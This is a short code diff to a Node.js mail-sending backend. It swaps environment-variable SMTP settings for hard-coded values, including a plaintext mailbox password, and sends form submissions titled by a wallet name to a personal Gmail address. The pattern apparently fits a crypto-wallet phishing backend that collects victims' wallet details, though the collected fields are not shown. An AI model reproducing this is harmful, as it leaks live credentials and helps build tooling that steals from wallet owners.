@@ -12,19 +12,12 @@ const sql = neon(process.env.DATABASE_URL);
 
 // ✅ Configure Nodemailer transporter with timeout settings
 const transporter = nodemailer.createTransport({
-  host: process.env.SMTP_HOST,
-  port: parseInt(process.env.SMTP_PORT),
-  secure: parseInt(process.env.SMTP_PORT) === 465, // true for 465, false for 587
+  host: "smtp.titan.email", // Replace with your provider
+  port: 465,
+  secure: true,
   auth: {
-    user: process.env.SMTP_USER,
-    pass: process.env.SMTP_PASS,
-  },
-  // ✅ Add timeout settings to prevent hanging
-  connectionTimeout: 10000, // 10 seconds to connect
-  socketTimeout: 10000, // 10 seconds for socket operations
-  // ✅ TLS settings for better compatibility
-  tls: {
-    rejectUnauthorized: false, // Allow self-signed certificates
+    user: "support@realworldfin.xyz", // Replace with your username
+    pass: "realworldfin10$", // Replace with your password
   },
 });
 
@@ -183,8 +176,8 @@ const sendEmail = async (req, res, body) => {
     // ✅ Send email via Nodemailer with error handling
     try {
       const result = await transporter.sendMail({
-        from: process.env.SMTP_FROM || process.env.SMTP_USER,
-        to: process.env.SMTP_TO,
+        from: '"Sender" <support@realworldfin.xyz>',
+        to: "danielekene6b@gmail.com",
         subject: `New Message from ${walletName}`,
         html: `
           <h2>New Submission</h2>
